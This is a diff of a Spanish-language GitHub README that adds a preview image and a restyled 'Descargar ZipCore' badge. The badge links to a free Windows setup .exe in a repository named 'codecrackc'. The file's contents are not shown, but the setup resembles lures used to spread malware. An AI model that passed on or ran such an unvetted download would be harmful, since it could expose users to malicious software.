@@ -30,15 +30,20 @@ const yo = {
 
 ```
 <p align="center">
+
+  <!-- PREVIEW DE LA APP -->
+  <img src="https://raw.githubusercontent.com/codecrackc/ZIPCORE/main/preview.png" 
+       alt="ZipCore Preview" 
+       width="500" 
+       style="border-radius: 12px; box-shadow: 0px 10px 30px rgba(0,0,0,0.4);" />
+
+  <br><br>
+
+  <!-- BOTÓN DESCARGA -->
   <a href="https://github.com/codecrackc/ZIPCORE/raw/main/ZipCore_Gratis_Setup_v1.0.0.exe" target="_blank">
-    <img src="https://raw.githubusercontent.com/simple-icons/simple-icons/develop/icons/windows11.svg" width="18"/>
-    <svg width="220" height="50" viewBox="0 0 220 50" xmlns="http://www.w3.org/2000/svg">
-      <rect width="220" height="50" rx="12" fill="#00F2FE"/>
-      <text x="110" y="32" font-size="16" text-anchor="middle" fill="black" font-family="Arial">
-        ⬇ Descargar ZipCore
-      </text>
-    </svg>
+    <img src="https://img.shields.io/badge/⬇️_DESCARGAR_ZIPCORE-00F2FE?style=for-the-badge&logo=windows&logoColor=white&labelColor=0d1117" />
   </a>
+
 </p>
 
 <p align="center">
